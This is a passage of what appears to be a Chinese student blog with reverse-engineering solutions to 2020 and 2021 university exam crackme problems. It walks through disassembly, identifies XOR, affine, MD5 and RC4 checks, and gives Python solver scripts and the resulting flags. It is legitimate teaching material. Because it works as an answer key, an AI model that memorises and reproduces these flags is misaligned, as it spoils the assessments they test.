byte_42CD78[ecx]</span><br><span class="line">cmp     edx, 41h</span><br><span class="line">jl      short loc_4013FD</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">movsx   ecx, byte_42CD78[eax]</span><br><span class="line">cmp     ecx, 5Ah</span><br><span class="line">jg      short loc_4013FD</span><br><span class="line">mov     [ebp+var_18], 41h</span><br><span class="line">mov     edx, [ebp+var_14]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">sub     eax, [ebp+var_18]</span><br><span class="line">mov     [ebp+var_1C], eax</span><br><span class="line">mov     eax, [ebp+var_1C]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_1C], edx</span><br><span class="line">mov     edx, [ebp+var_1C]</span><br><span class="line">add     edx, [ebp+var_18]</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">mov     byte_42CD78[eax], dl</span><br></pre></td></tr></table></figure><p>异常处理函数内部逻辑比较简单，就是对我们输入的字符串中的字母应用仿射加密，其中乘数（var_4）为3，var_8为7。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_8]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">cmp     eax, dword_429A44[ecx*4]</span><br><span class="line">jz      short loc_4012AA</span><br></pre></td></tr></table></figure><p>与429A44处进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">429A44处字符串为wohz&#123;M1hu-71-4h0-9t-h-!&#125;</span><br></pre></td></tr></table></figure><p>解密得flag为<code>flag&#123;T1an-71-4a0-9e-a-!&#125;</code>。</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021逆向期末试题</title>
      <link href="/2022/07/re2021/"/>
      <url>/2022/07/re2021/</url>
      
        <content type="html"><![CDATA[<p>这课真的不是密码学吗？</p><p>链接：<a href="https://pan.baidu.com/s/1hT5ineHI-EAfWPUF6AHoyA?pwd=glqk">https://pan.baidu.com/s/1hT5ineHI-EAfWPUF6AHoyA?pwd=glqk</a><br>提取码：glqk</p><h2 id="cpp-1">cpp.1</h2><p>看到VirtualProtect，一眼hook，不过这题跟hook没有太大关系。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">00401118  mov     byte ptr [ebp-1C], 1A</span><br><span class="line">0040111C  mov     byte ptr [ebp-1B], 0A</span><br><span class="line">00401120  mov     byte ptr [ebp-1A], 0E</span><br><span class="line">00401124  mov     byte ptr [ebp-19], 7</span><br><span class="line">00401128  mov     byte ptr [ebp-18], 11</span><br><span class="line">0040112C  mov     byte ptr [ebp-17], 7</span><br><span class="line">00401130  mov     byte ptr [ebp-16], 0D</span><br><span class="line">00401134  mov     byte ptr [ebp-15], 0</span><br><span class="line">00401138  mov     dword ptr [ebp-20], 0</span><br><span class="line">0040113F  call    00401005</span><br><span class="line">00401144  push    0042803C        ;  ASCII &quot;Please input your flag &quot;</span><br><span class="line">00401149  call    004019C0</span><br><span class="line">0040114E  add     esp, 4</span><br><span class="line">00401151  lea     eax, dword ptr [ebp-14]</span><br><span class="line">00401154  push    eax</span><br><span class="line">00401155  push    00428038        ;  ASCII &quot;%s&quot;</span><br><span class="line">0040115A  call    00401960</span><br><span class="line">0040115F  add     esp, 8</span><br><span class="line">00401162  mov     dword ptr [ebp-20], 0</span><br><span class="line">00401169  jmp     short 00401174</span><br><span class="line">0040116B  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">0040116E  add     ecx, 1</span><br><span class="line">00401171  mov     dword ptr [ebp-20], ecx</span><br><span class="line">00401174  cmp     dword ptr [ebp-20], 7</span><br><span class="line">00401178  jge     short 00401195</span><br><span class="line">0040117A  mov     edx, dword ptr [ebp-20]</span><br><span class="line">0040117D  movsx   eax, byte ptr [ebp+edx-14]</span><br><span class="line">00401182  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">00401185  movsx   edx, byte ptr [ebp+ecx-1C]</span><br><span class="line">0040118A  xor     eax, edx</span><br><span class="line">0040118C  mov     ecx, dword ptr [ebp-20]</span><br><span class="line">0040118F  mov     byte ptr [ebp+ecx-1C], al</span><br><span class="line">00401193  jmp     short 0040116B</span><br></pre></td></tr></table></figure><p>分析可得输入字符串与一个字符串进行异或，再与以下字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串为0x72,0x65,0x61,0x6C,0x70,0x77,0x64</span><br></pre></td></tr></table></figure><p>求解脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x6C</span>,<span class="number">0x70</span>,<span class="number">0x77</span>,<span class="number">0x64</span>]</span><br><span class="line">b = [<span class="number">0x1A</span>,<span class="number">0x0A</span>,<span class="number">0x0E</span>,<span class="number">0x7</span>,<span class="number">0x11</span>,<span class="number">0x7</span>,<span class="number">0xD</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">c.append(<span class="built_in">chr</span>(a[i]^b[i]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>flag为<code>hookapi</code>。</p><h2 id="cpp-2">cpp.2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_1C]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_1C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+strlen], eax</span><br><span class="line">cmp     [ebp+strlen], 7</span><br><span class="line">jz      short loc_4010BC</span><br></pre></td></tr></table></figure><p>要求输入为7个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_1C]</span><br><span class="line">and     edx, 3Ch</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">and     ecx, 0C0h</span><br><span class="line">sar     ecx, 6</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">and     ecx, 3</span><br><span class="line">shl     ecx, 6</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_1C], d</span><br></pre></td></tr></table></figure><p>主要逻辑是将var_14的每一字符的高两位和低两位对调，即若原字符为x<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>1</sub>x<sub>0</sub><br>则现在的字符为x<sub>1</sub>x<sub>0</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>7</sub>x<sub>6</sub>，再与存于var_14处的字符串进行异或。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_1C]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, [ebp+edx+var_C]</span><br><span class="line">cmp     ecx, eax</span><br><span class="line">jz      short loc_401147</span><br></pre></td></tr></table></figure><p>最后与var_C处字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+var_C], 83h</span><br><span class="line">mov     [ebp+var_B], 55h</span><br><span class="line">mov     [ebp+var_A], 13h</span><br><span class="line">mov     [ebp+var_9], 14h</span><br><span class="line">mov     [ebp+var_8], 83h</span><br><span class="line">mov     [ebp+var_7], 88h</span><br><span class="line">mov     [ebp+var_6], 0C7h</span><br><span class="line">mov     [ebp+var_5], 0</span><br><span class="line">mov     [ebp+var_14], 2</span><br><span class="line">mov     [ebp+var_13], 0</span><br><span class="line">mov     [ebp+var_12], 2</span><br><span class="line">mov     [ebp+var_11], 1</span><br><span class="line">mov     [ebp+var_10], 6</span><br><span class="line">mov     [ebp+var_F], 1</span><br><span class="line">mov     [ebp+var_E], 16h</span><br></pre></td></tr></table></figure><p>var_14和var_C开始的7个字节的值如上。<br>求解脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x2</span>,<span class="number">0x0</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x6</span>,<span class="number">0x1</span>,<span class="number">0x16</span>]</span><br><span class="line">b = [<span class="number">0x83</span>,<span class="number">0x55</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x83</span>,<span class="number">0x88</span>,<span class="number">0x0C7</span>]</span><br><span class="line">c = []</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">d = a[i]^b[i]</span><br><span class="line">d = ((d&amp;<span class="number">0xC0</span>)&gt;&gt;<span class="number">6</span>) | (d&amp;<span class="number">0x3C</span>) | ((d&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">c.append(<span class="built_in">chr</span>(d))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>得到flag为<code>BUPTFJS</code>。</p><h2 id="cpp-3">cpp.3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401096   mov     ecx, dword ptr [ebp-78]</span><br><span class="line">00401099   movsx   edx, byte ptr [ebp+ecx-6C]</span><br><span class="line">0040109E   cmp     edx, 61</span><br><span class="line">004010A1   jl      short 004010B0</span><br><span class="line">004010A3   mov     eax, dword ptr [ebp-78]</span><br><span class="line">004010A6   movsx   ecx, byte ptr [ebp+eax-6C]</span><br><span class="line">004010AB   cmp     ecx, 7A</span><br></pre></td></tr></table></figure><p>要求输入范围为a-z。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">004010D9   mov     ecx, dword ptr [ebp-78]</span><br><span class="line">004010DC   movsx   edx, byte ptr [ebp+ecx-6C]</span><br><span class="line">004010E1   sub     edx, 61</span><br><span class="line">004010E4   mov     dword ptr [ebp-70], edx</span><br><span class="line">004010E7   mov     eax, dword ptr [ebp-70]</span><br><span class="line">004010EA   imul    eax, dword ptr [ebp-4]</span><br><span class="line">004010EE   add     eax, dword ptr [ebp-8]</span><br><span class="line">004010F1   cdq</span><br><span class="line">004010F2   mov     ecx, 1A</span><br><span class="line">004010F7   idiv    ecx</span><br><span class="line">004010F9   mov     dword ptr [ebp-70], edx</span><br><span class="line">004010FC   mov     edx, dword ptr [ebp-70]</span><br><span class="line">004010FF   add     edx, 61</span><br></pre></td></tr></table></figure><p>是仿射加密，var_4和var_8的值均为5。<br>加密后得到的字符串与字符串<code>jmzfwgfibz</code>作比较。<br>可以求得flag为<code>greatvalue</code>。</p><h2 id="cpp-4">cpp.4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_434]</span><br><span class="line">movsx   eax, [ebp+edx+var_424]</span><br><span class="line">cmp     eax, 30h</span><br><span class="line">jl      short loc_402245</span><br><span class="line">mov     ecx, [ebp+var_434]</span><br><span class="line">movsx   edx, [ebp+ecx+var_424]</span><br><span class="line">cmp     edx, 39h</span><br><span class="line">jle     short loc_40224D</span><br></pre></td></tr></table></figure><p>要求输入范围为0-9。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_430], 5</span><br><span class="line">jnb     short loc_402267</span><br><span class="line">push    4               ; int</span><br><span class="line">lea     edx, [ebp+var_42C]</span><br><span class="line">push    edx             ; int</span><br><span class="line">lea     eax, [ebp+var_24]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    sub_401014</span><br></pre></td></tr></table></figure><p>可知输入长度要求为5个字符。同时根据对后面的分析，只对前4个字符进行处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0042805C dword_42805C    dd 0D76AA478h</span><br><span class="line">.rdata:00428060 dword_428060    dd 0E8C7B756h</span><br><span class="line">.rdata:00428064 dword_428064    dd 242070DBh</span><br><span class="line">.rdata:00428068 dword_428068    dd 0C1BDCEEEh</span><br></pre></td></tr></table></figure><p>是MD5，加密后的字符串与字符串<code>eb62f6b9306db575c2d596b1279627a4</code>做比较。求得对应明文为<code>0123</code>，需要在后面再添加一个数字。</p><h2 id="cpp-5">cpp.5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_CC]</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">mov     cl, byte ptr [ebp+eax+var_C8]</span><br><span class="line">mov     edx, [ebp+var_CC]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte_429B30[edx]</span><br><span class="line">cmp     ecx, eax</span><br><span class="line">jz      short loc_401113</span><br></pre></td></tr></table></figure><p>本题要求var_C8处字符串与byte_429B30字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">mov     esi, [ebp+var_8]</span><br><span class="line">add     esi, dword_42CE3C[ecx*4]</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">cdq</span><br><span class="line">idiv    [ebp+var_C]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte ptr aSecrets[edx] ; &quot;secrets&quot;</span><br><span class="line">add     esi, eax</span><br><span class="line">and     esi, 800000FFh</span><br><span class="line">jns     short loc_401232</span><br><span class="line">loc_401232:</span><br><span class="line">mov     [ebp+var_8], esi</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">mov     dl, byte ptr dword_42CE3C[ecx*4]</span><br><span class="line">mov     byte ptr [ebp+var_10], dl</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">mov     edx, dword_42CE3C[ecx*4]</span><br><span class="line">mov     dword_42CE3C[eax*4], edx</span><br><span class="line">mov     eax, [ebp+var_10]</span><br><span class="line">and     eax, 0FFh</span><br><span class="line">mov     ecx, [ebp+var_8]</span><br><span class="line">mov     dword_42CE3C[ecx*4], eax</span><br><span class="line">jmp     short loc_4011F2</span><br></pre></td></tr></table></figure><p>根据上述算法进行推断为RC4算法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始密钥为secrets。</span><br><span class="line">byte_429B30为0x10,0x2C,0x2,0x0FC,0x0FB,0x3B,0x0D,0x73,0x6E,0x0BC,0x0B9,0x0A7,0x6F,0x2F.</span><br></pre></td></tr></table></figure><p>根据下面的代码可知，是先将密钥流取反，再与输入的字符串进行异或。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and     eax, 0FFh</span><br><span class="line">not     eax</span><br><span class="line">xor     ebx, eax</span><br></pre></td></tr></table></figure><p>所以可以等价为先对<code>byte_429B30</code>取反，再与密钥流进行异或。<br>可以求得flag为<code>seeyounextyear</code>。（感觉这个flag不是很友善）</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020逆向期末试题</title>
      <link href="/2022/07/re2020/"/>
      <url>/2022/07/re2020/</url>
      
        <content type="html"><![CDATA[<p>考试时间很紧，还需要写过程，肯定是没空慢慢分析的，所以需要带🔥对常用的算法或知识点比较熟悉。一般涉及内容为加解密算法逆向、SEH、hook、花指令。</p><p>加解密算法的关键是了解加解密算法的一些特征（如DES的S-box，RC4的循环次数），算法的部分特征参数可以成为确定算法的关键。了解算法，调试好解密程序，基本没有什么问题。值得注意的是题目可能会在一些地方动手脚，一般会在明文、密文或密钥上面动手脚，如替换某些字符，字符串整体加1等。也有可能会采取组合加密的方式，不过目前没遇到过。基本不可能在算法上面做文章，因为这意味着需要修改解密脚本，比较费时（两个小时，想peach，这么干估计挂科的人得增加一半）。</p><p>题目：<br>链接：<a href="https://pan.baidu.com/s/19lSS-Z6NcW9Bef5bOJ_aHg?pwd=3bmr">https://pan.baidu.com/s/19lSS-Z6NcW9Bef5bOJ_aHg?pwd=3bmr</a><br>提取码：3bmr</p><h2 id="cpp-1">cpp.1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_18]</span><br><span class="line">push    eax</span><br><span class="line">call    sub_401005      ; scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_18]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_30], eax</span><br><span class="line">cmp     [ebp+var_30], 0Fh</span><br><span class="line">jz      short loc_401179</span><br></pre></td></tr></table></figure><p>要求输入的字符串长度为15个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_18]        ; var_18为我们输入的字符串</span><br><span class="line">mov     eax, [ebp+var_30]            ; var_30为我们输入字符串的长度</span><br><span class="line">sub     eax, 1</span><br><span class="line">sub     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, byte_427A30[eax]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_2C], dl</span><br></pre></td></tr></table></figure><p>主要逻辑是取出427A30处字符串的一个字符，取出字符的索引为var_30-1-var_4，若将var_4重命名为i，var_30正常情况下为15，则索引值为14-i，即将427A30处字符串反序取出，并于var_18进行异或，结果存于var_2C中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_2C]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, byte_427A40[edx]</span><br><span class="line">cmp     ecx, eax</span><br></pre></td></tr></table></figure><p>最终所得结果与427A40处字符串进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">427A30处字符串反序为0xF,0xE,0xD,0xC,0xB,0xA,9,8,7,6,5,4,3,2,1</span><br><span class="line">427A40处字符串为42h,61h,7Fh,69h,5Fh,62h,6Ch,66h,41h,74h,6Ch,61h,6Dh,66h,72h</span><br></pre></td></tr></table></figure><p>所以我们只需将427A40处字符串与427A30处字符串反序进行异或即可求解出结果。<br>求解脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x42</span>,<span class="number">0x61</span>,<span class="number">0x7F</span>,<span class="number">0x69</span>,<span class="number">0x5F</span>,<span class="number">0x62</span>,<span class="number">0x6C</span>,<span class="number">0x66</span>,<span class="number">0x41</span>,<span class="number">0x74</span>,<span class="number">0x6C</span>,<span class="number">0x61</span>,<span class="number">0x6D</span>,<span class="number">0x66</span>,<span class="number">0x72</span>]</span><br><span class="line">b = [<span class="number">0xF</span>,<span class="number">0xE</span>,<span class="number">0xD</span>,<span class="number">0xC</span>,<span class="number">0xB</span>,<span class="number">0xA</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">d = a[i] ^ b[i]</span><br><span class="line">d = <span class="built_in">chr</span>(d)</span><br><span class="line">c += d</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><p>求得flag为“MoreThenFriends”。</p><h2 id="cpp-2">cpp.2</h2><p>使用IDA进行分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_28]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_28]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_2C], eax</span><br><span class="line">cmp     [ebp+var_2C], 12h</span><br><span class="line">jz      short loc_4011A3</span><br></pre></td></tr></table></figure><p>易知要求我们输入长度为18个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    10h</span><br><span class="line">lea     edx, [ebp+var_28]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">push    offset byte_42CC9C ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>将我们输入的前16个字节的内容拷贝到0x42CC9C处。<br>再由<code>mov [ebp+var_8], 0</code>和<code>idiv [ebp+var_8]</code>可知，除数为0，程序发生异常。<br>再使用od进行分析，可以得到程序的异常处理函数的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">00401056  jmp     short 00401061</span><br><span class="line">00401058  mov     eax, dword ptr [ebp-4]</span><br><span class="line">0040105B  add     eax, 1</span><br><span class="line">0040105E  mov     dword ptr [ebp-4], eax</span><br><span class="line">00401061  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">00401064  cmp     ecx, dword ptr [ebp-8]</span><br><span class="line">00401067  jge     short 004010A7</span><br><span class="line">00401069  mov     edx, dword ptr [ebp-4]</span><br><span class="line">0040106C  movsx   eax, byte ptr [edx+42CC9C]</span><br><span class="line">00401073  and     eax, 0F0</span><br><span class="line">00401078  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040107B  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">00401082  and     edx, 0C</span><br><span class="line">00401085  sar     edx, 2</span><br><span class="line">00401088  or      eax, edx</span><br><span class="line">0040108A  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040108D  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">00401094  and     edx, 3</span><br><span class="line">00401097 